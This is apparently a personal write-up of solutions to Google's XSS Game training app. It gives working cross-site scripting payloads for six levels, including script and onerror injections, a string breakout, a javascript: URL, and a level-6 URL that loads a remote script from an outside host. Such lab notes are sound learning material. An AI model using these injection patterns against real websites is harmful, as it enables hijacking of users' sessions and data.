# Notes on Google's [XSS Game][1] Web App

## Level 1
Level 1 can be exploited by injecting XSS code into either the form field or the URL. Both of these examples work if you paste them into the form field and press the Search button:

```html
<img src=x onerror="alert('xss')">
<script>alert("xss");</script>
```

Both of the above examples also work if you inject them into the URL and press the Go button (which is part of the fake browser). The only limitation I found was that code injected into the URL will not work if it has a semicolon. In the second example above, you could just omit the semicolon, since it is only a one-line script.

But the attack does work through the URL if you just URL-encode the semicolon as `%3B`. Note that you'll have to prepend your attack code with: `?query=`. So you're concatenating three separate pieces:
1. `https://xss-game.appspot.com/level1/frame`
2. `?query=`
3. `<script>alert("xss")%3B</script>`

The full URL is now:
```code
https://xss-game.appspot.com/level1/frame?query=<script>alert("xss")%3B</script>
```



## Level 2

```
" onerror=alert('xss')/> <img src="cloud1.jpg">
```

## Level 3
To get past Level 3 I had to use Safari (10.0.3) because Firefox (51.0.1) and Chrome (55.0.2883.95) both prevented the injection of a space, encoded or not, after the single quote. Here is the full URL I used to successfully pass Level 3 with Safari:
```
https://xss-game.appspot.com/level3/frame' onerror="alert('xss')"
```
But I wanted to keep working with Firefox. So I stole Safari's cookie called "level3".
I configured Safari to use the Burp proxy, then copied the name and value of the third cookie:
```
level1=f148716ef4ed1ba0f192cde4618f8dc5; level2=b5e530302374aa71cc3028c810b63641; level3=d5ce029d0680b3816a349da0d055fcfa
```
Here's how to set a new cookie in FF or Chrome using the console in dev tools:
```javascript
document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
```
Now you can advance to level 4 in FF or Chrome.

## Level 4

https://xss-game.appspot.com/level4

For Level 4 I had to look up somebody else's answer and play with it because it was not working as they described. Eventually I found that, in all three browsers, it only worked if you input it into the input field. It would not work on the URL.
```
');alert();var b=('
```

## Level 5
I got through Level 5 with this URL:
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```
But clicking the Go button next to the URL did not work. I had to actually click the "Next >>" button. That button, if you mouse over it, showed that it's target was:
```
javascript:alert(1)
```

By me having edited the URL manually, that button's href value had changed to my input.


## Level 6
For Level 6 I had to look up the answer. It turns out that the regex was not case sensitive, so this is the successful URL:
```
https://xss-game.appspot.com/level6/frame#HTTPS://xss.rocks/xss.js
```
[1]: https://xss-game.appspot.com/
